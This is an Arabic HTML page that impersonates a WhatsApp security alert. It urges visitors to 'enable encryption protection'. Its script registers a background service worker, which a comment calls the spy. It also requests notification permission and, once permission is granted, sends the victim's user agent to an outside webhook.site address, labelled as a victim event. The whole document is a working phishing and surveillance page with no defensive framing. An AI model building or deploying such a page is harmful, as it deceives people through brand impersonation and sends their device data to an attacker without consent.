<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تأمين حساب واتساب</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 50px; background: #f0f2f5; }
        .card { background: white; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        button { background: #128c7e; color: white; border: none; padding: 15px 30px; border-radius: 25px; cursor: pointer; font-size: 18px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="60"><br>
        <h2>تنبيه أمني هام</h2>
        <p>يرجى تفعيل "إشعارات التشفير" فوراً لحماية محادثاتك من المتسللين.</p>
        <button onclick="activateSpy()">تفعيل الحماية الآن</button>
    </div>

    <script>
        // تسجيل الجاسوس في الخلفية
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        function activateSpy() {
            Notification.requestPermission().then(permission => {
                if (permission === 'granted') {
                    // إرسال إشارة "صيد" فورية لـ Webhook لتتأكد أن الربط يعمل
                    fetch('https://webhook.site/67c1ee4b-66bd-4c2e-90be-50a7474be300', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ event: "Victim_Accepted_Permission", device: navigator.userAgent })
                    });
                    alert("تم تفعيل نظام التشفير بنجاح!");
                }
            });
        }
    </script>
</body>
</html>
